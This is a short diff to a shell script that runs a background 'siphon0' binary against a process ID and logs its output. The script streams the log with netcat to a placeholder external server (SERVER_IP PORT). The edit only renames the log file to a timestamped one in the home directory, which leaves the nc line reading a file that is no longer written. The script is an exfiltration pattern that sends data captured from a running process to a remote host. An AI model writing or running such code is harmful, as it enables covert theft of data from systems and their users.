@@ -8,7 +8,8 @@ PID=$!
 
 # Run /bin/siphon in the background, redirect its output to /output.txt
 # Send /output.txt content to an external server using Netcat (nc)
-/bin/siphon0 "$PID" >> /output.txt 2>&1 &
+TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
+/bin/siphon0 "$PID" >> ~/output_${TIMESTAMP}.txt 2>&1 &
 
 # Use Netcat to send the log to an external server (replace SERVER_IP and PORT)
 tail -f /output.txt | nc SERVER_IP PORT &
